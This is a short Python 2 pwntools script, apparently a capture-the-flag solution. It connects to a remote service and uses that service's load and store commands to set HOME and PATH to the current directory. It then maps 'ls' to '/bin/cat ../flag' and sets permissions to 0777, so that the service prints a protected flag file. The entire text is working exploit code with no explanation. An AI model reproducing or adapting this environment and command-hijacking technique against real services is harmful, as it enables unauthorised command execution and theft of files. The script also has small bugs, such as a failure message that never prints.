
from sys import argv
from pwn import *

def command(r, com, variable, value):
    context.log_level = "error"
    #print "This is the second",r.recvuntil(":")
    r.sendline(com)
    r.sendline(variable)
    if value == 0:
        return 0
    else:
        r.sendline(value)
        return 0

def whattheenv(IPaddr, port):

        context.log_level = "error"

	r = remote(IPaddr, int(port))
        #print "This is the first", 
        #r.recvuntil(":")
        command(r,"load","HOME",".")
        command(r,"load","PATH",".")
        command(r,"load","ls","/bin/cat ../flag") 
        command(r,"load","permissions","0777")
        command(r,"store","permissions",0)
        command(r,"store","ls",0)
        #r.recvuntil(":")
        r.sendline("quit")
        output = r.recvall()
        if "FLAG" in output:
            pos = output.find("FLAG")
            print output[pos:]
        else:
            "No flag received"
whattheenv(argv[1], argv[2])

